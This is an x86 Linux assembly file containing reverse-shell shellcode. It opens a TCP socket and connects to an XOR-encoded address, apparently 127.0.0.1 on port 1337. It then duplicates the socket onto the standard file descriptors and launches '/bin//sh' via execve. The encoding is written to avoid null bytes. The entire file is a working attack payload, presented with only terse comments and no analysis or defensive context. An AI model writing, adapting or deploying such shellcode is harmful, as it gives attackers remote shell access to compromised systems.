SECTION .text
	GLOBAL _start

_start:
	xor	esi,	esi

	push	esi ; push arguments for socket creation
	push	0x1
	push	0x2
	
	push	0x66 ; socketcall
	pop	eax
	push	0x1
	pop	ebx
	mov	ecx,	esp
	int	0x80

	mov	ebp,	eax ; copy the socket file descriptor into ebp

	push	0x2010101 ; create structure for socket connection & push as argument
	xor	dword [esp],	0x301017e
	push	0x1010101
	xor	dword [esp],	0x38040103
	mov	ecx,	esp
	push	0x10
	push	ecx
	push	ebp

	push	0x66 ; socketcall
	pop	eax
	push	0x3
	pop	ebx
	mov	ecx,	esp
	int	0x80

	mov	ebx,	ebp ; copy sockfd into ebx for dup2
	xor	ecx,	ecx ; set dup2 counter

_dup2loop:          ; dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2); dup2(sockfd, 3)
	push	0x3f
	pop	eax
	int	0x80
	inc	ecx
	cmp	ecx,	4
	jnz	_dup2loop

	push	0x0b ; execve("/bin//sh", NULL, NULL)
	pop	eax
	push	esi
	push	0x68732f2f
	push	0x6e69622f
	mov	ebx,	esp
	xor	ecx,	ecx
	xor	edx,	edx
	int	0x80
